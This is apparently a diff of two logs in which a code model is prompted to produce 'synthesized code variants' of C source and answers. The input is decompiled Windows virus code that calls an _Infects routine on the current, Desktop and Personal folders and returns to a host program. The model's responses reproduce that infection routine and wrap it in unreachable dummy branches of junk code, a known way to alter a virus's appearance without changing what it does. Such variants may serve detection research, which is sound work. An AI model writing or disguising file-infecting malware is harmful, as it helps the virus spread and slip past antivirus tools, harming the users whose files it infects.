@@ -2,10 +2,10 @@
 {
   "finish_reason": "stop",
   "attempts": 1,
-  "response_chars": 3407
+  "response_chars": 3575
 }
 
-=== PROMPT (7110 chars) ===
+=== PROMPT (7090 chars) ===
 
             You are an expert C developer generating synthesized code variants.
             Target architecture: x86
@@ -96,14 +96,15 @@
             ### INPUT CODE:
             
 #include "data_globals.h"
-#include <stdint.h>
 #include <windows.h>
+#include <stdint.h>
+#include <stdlib.h>
 
 void _WinMain_16(void)
 {
-    int32_t folderResult;
+    int32_t result;
     char currentDir[260];
-    uint8_t specialFolder[260];
+    uint8_t specialPath[260];
     uint32_t bytesRead;
     char modulePath[260];
     uint32_t fileSize;
@@ -125,14 +126,14 @@ void _WinMain_16(void)
     fileSize = GetFileSize(fileHandle, (LPDWORD)0x0);
     CloseHandle(fileHandle);
     _Infects();
-    folderResult = _GetSpecialFolder(specialFolder, "Desktop");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Desktop");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
-    folderResult = _GetSpecialFolder(specialFolder, "Personal");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Personal");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
     if (_VirusSize < fileSize) {
@@ -145,58 +146,57 @@ void _WinMain_16(void)
             Use ```c according to the detected input language. 
             
 
-=== RESPONSE (3407 chars) ===
+=== RESPONSE (3575 chars) ===
 ```c
 #include "data_globals.h"
-#include <stdint.h>
 #include <windows.h>
-#include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
+#include <stdio.h>
 #include <string.h>
 
 void _WinMain_16(void)
 {
-    int32_t folderResult;
+    int32_t result;
     char currentDir[260];
-    uint8_t specialFolder[260];
+    uint8_t specialPath[260];
     uint32_t bytesRead;
     char modulePath[260];
     uint32_t fileSize;
     HANDLE fileHandle;
 
-    /* --- DEAD BRANCH 1 (Pattern A: Math Invariant) --- */
+    /* --- INSERTED DEAD BRANCH 1 (Pattern A: Math Invariant) --- */
     volatile int dummy_x_1 = 7;
     if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
-        /* Category A – System info queries */
-        SYSTEM_INFO si;
-        GetSystemInfo(&si);
+        /* Dummy logic – Category A (System info queries) */
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
 
         SYSTEMTIME st;
         GetLocalTime(&st);
 
-        char userName[256];
-        DWORD userNameSize = sizeof(userName);
-        GetUserNameA(userName, &userNameSize);
+        volatile char infoBuf[128];
+        sprintf_s((char*)infoBuf, sizeof(infoBuf),
+                  "Proc:%u Mem:%llu Time:%02u:%02u:%02u",
+                  sysInfo.dwNumberOfProcessors,
+                  sysInfo.ullTotalPhys,
+                  st.wHour, st.wMinute, st.wSecond);
 
-        char computerName[256];
-        DWORD compNameSize = sizeof(computerName);
-        GetComputerNameA(computerName, &compNameSize);
-
-        /* Dummy hash computation loops */
-        volatile unsigned long hash = 2166136261U;
-        for (int i = 0; i < 2; ++i) {
-            hash ^= (unsigned long)si.dwNumberOfProcessors;
-            hash *= 16777619U;
+        /* Dummy loops */
+        volatile unsigned int checksum = 0;
+        for (int i = 0; i < 3; ++i) {
+            checksum ^= (unsigned int)infoBuf[i];
         }
         for (int i = 0; i < 2; ++i) {
-            hash ^= (unsigned long)st.wYear;
-            hash *= 16777619U;
+            checksum = (checksum << 1) | (checksum >> 31);
         }
-        (void)hash;   /* discard result */
 
-        /* Clean up dummy buffers */
-        SecureZeroMemory(userName, sizeof(userName));
-        SecureZeroMemory(computerName, sizeof(computerName));
+        /* Read an outer variable (allowed) */
+        volatile int dummyRead = result;
+        (void)dummyRead;
+
+        /* Clean up dummy buffer */
+        SecureZeroMemory((void*)infoBuf, sizeof(infoBuf));
     }
 
     fileHandle = (HANDLE)0x0;
@@ -215,14 +215,14 @@ void _WinMain_16(void)
     fileSize = GetFileSize(fileHandle, (LPDWORD)0x0);
     CloseHandle(fileHandle);
     _Infects();
-    folderResult = _GetSpecialFolder(specialFolder, "Desktop");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Desktop");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
-    folderResult = _GetSpecialFolder(specialFolder, "Personal");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Personal");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
     if (_VirusSize < fileSize) {
@@ -230,27 +230,31 @@ void _WinMain_16(void)
         _ReturnToHost(modulePath);
     }
 
-    /* --- DEAD BRANCH 2 (Pattern B: System Query) --- */
+    /* --- INSERTED DEAD BRANCH 2 (Pattern B: System Query) --- */
     if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
-        /* Category B – Memory & String operations */
-        char *buf = (char*)malloc(128);
-        if (buf) {
-            const char *fmt = "Dummy %d %s";
-            int len = sprintf_s(buf, 128, fmt, 42, "test");
+        /* Dummy logic – Category B (Memory & String operations) */
+        volatile char *tmpBuf = (char*)malloc(64);
+        if (tmpBuf) {
+            const char *msg = "DummyData";
+            size_t len = strlen(msg);
+            memcpy(tmpBuf, msg, len);
+            tmpBuf[len] = '\0';
 
-            /* Dummy checksum loops */
-            volatile unsigned int checksum = 0;
-            for (int i = 0; i < len && i < 2; ++i) {
-                checksum ^= (unsigned int)buf[i];
-            }
-            for (int i = 0; i < 2; ++i) {
-                checksum = (checksum << 1) | (checksum >> 31);
-            }
-            (void)checksum;   /* discard result */
+            char local[80];
+            sprintf_s(local, sizeof(local), "Len=%zu", len);
 
-            /* Clean up dummy buffer */
-            memset(buf, 0, 128);
-            free(buf);
+            /* Dummy hash computation */
+            volatile unsigned int hash = 2166136261U; /* FNV‑1a offset basis */
+            for (size_t i = 0; i < len; ++i) {
+                hash ^= (unsigned int)tmpBuf[i];
+                hash *= 16777619U;               /* FNV‑1a prime */
+            }
+            (void)hash;   /* suppress unused warning */
+
+            /* Clean up dummy buffers */
+            memset(tmpBuf, 0, 64);
+            SecureZeroMemory(local, sizeof(local));
+            free((void*)tmpBuf);
         }
     }
 
